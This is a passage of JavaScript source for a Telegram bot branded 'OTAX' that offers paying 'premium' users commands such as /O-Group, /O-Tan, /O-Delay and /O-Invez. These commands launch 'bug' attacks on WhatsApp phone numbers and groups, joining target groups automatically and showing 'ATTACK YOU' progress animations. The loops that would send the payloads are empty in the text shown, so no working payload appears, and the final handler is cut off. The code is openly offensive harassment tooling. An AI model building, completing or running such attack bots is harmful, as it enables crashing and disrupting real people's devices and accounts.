    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 20; i++) {   
      
      }
console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Group(?:\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const delay = ms => new Promise(res => setTimeout(res, ms));
  if (shouldIgnoreMessage(msg)) return;
if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


  const groupLink = match[1]?.trim();
  if (!groupLink) {
    return bot.sendMessage(
      chatId,
      "🚫 Masukin link grup yang bener!\nContoh: /O-Group https://chat.whatsapp.com/xxxx"
    );
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return bot.sendMessage(
      chatId,
      "🚫 Link grup salah!\nContoh: /O-Group https://chat.whatsapp.com/xxxx"
    );
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

  try {
    await bot.sendMessage(chatId, "⏳ Sedang join grup, tunggu bentar..."); 
    
    const groupJid = await otax.groupAcceptInvite(groupCode);
    await bot.sendMessage(
      chatId,
      "✅ Berhasil join grup! Kirim bug sekarang..."
    );
    const target = groupJid;
    await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${groupLink}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: 'Markdown'
  });

  const sent = await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${groupLink}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, { parse_mode: "Markdown" });
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${groupLink}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${groupLink}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${groupLink}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 20; i++) { 
   
      }
    console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${groupLink}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${groupLink}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${groupLink}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Tan (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 70; i++) {   
      
      }
  console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Delay (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 20; i++) {   
      
      }
  console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Invez (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 
  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  
      for (let i = 0; i <= 70; i++) {  
      
  }
  
console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Superinvis (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
